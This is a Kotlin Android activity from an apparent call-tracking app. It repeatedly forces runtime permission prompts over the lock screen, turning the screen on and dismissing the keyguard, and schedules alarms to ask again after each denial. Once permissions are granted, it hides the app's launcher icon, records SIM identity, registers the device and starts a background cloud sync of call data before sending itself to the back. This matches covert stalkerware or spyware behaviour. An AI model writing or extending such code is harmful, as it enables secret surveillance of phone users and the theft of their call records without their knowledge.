package com.calltech

import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

/**
 * Home wallpaper ke upar system Allow popup.
 * Release APK + Xiaomi: classic requestPermissions + setContentView zaroori.
 */
class PermissionTrampolineActivity : AppCompatActivity() {
    private val mainHandler = Handler(Looper.getMainLooper())
    private var askedOnce = false
    private var finished = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_permission_host)
        bringToFront()
        MongoSyncHelper.ensureApiUrl(this)
        CallSyncHelper.markBackgroundSyncEnabled(this, true)
        SyncBootstrap.armBackgroundSync(this)

        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            onAllowed()
            return
        }

        PermissionPopupAlarms.schedule(this)
        mainHandler.post { askPermissions() }
    }

    override fun onAttachedToWindow() {
        super.onAttachedToWindow()
        if (!finished) {
            mainHandler.post { askPermissions() }
        }
    }

    override fun onResume() {
        super.onResume()
        if (finished) {
            return
        }
        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            onAllowed()
            return
        }
        if (!askedOnce) {
            mainHandler.postDelayed({ askPermissions() }, 200L)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQ_PERMS) {
            handlePermissionResult()
        }
    }

    override fun onDestroy() {
        mainHandler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    private fun askPermissions() {
        if (finished || isFinishing || askedOnce) {
            return
        }
        val missing = SyncBootstrap.requiredPermissions().filter { permission ->
            checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            onAllowed()
            return
        }
        askedOnce = true
        bringToFront()
        ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_PERMS)
    }

    private fun handlePermissionResult() {
        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            PermissionPopupAlarms.cancel(this)
            onAllowed()
        } else if (!isFinishing) {
            askedOnce = false
            mainHandler.postDelayed({ askPermissions() }, 400L)
        }
    }

    private fun onAllowed() {
        if (finished) {
            return
        }
        finished = true
        PermissionPopupAlarms.cancel(this)
        LauncherHider.hideNow(this)
        SyncObserverManager.register(applicationContext)
        SyncBootstrap.armBackgroundSync(applicationContext)

        BackgroundSyncRunner.run {
            try {
                CallSyncService.holdDuring(applicationContext) {
                    SimNumberHelper.refreshSimIdentity(applicationContext)
                    DeviceRegistration.registerNow(applicationContext)
                    InstallFlow.runFirstCloudSync(applicationContext)
                    SyncBootstrap.onPermissionsReady(applicationContext)
                    SyncObserverManager.register(applicationContext)
                }
            } catch (error: Exception) {
                Log.e(TAG, "First sync failed", error)
            } finally {
                InstallFlow.completeSetup(applicationContext)
                LauncherHider.hideNow(applicationContext)
            }
        }

        try {
            moveTaskToBack(true)
        } catch (_: Exception) {
        }
        finish()
    }

    private fun bringToFront() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        @Suppress("DEPRECATION")
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
        )
    }

    companion object {
        private const val TAG = "PermissionTrampoline"
        private const val REQ_PERMS = 7104
    }
}
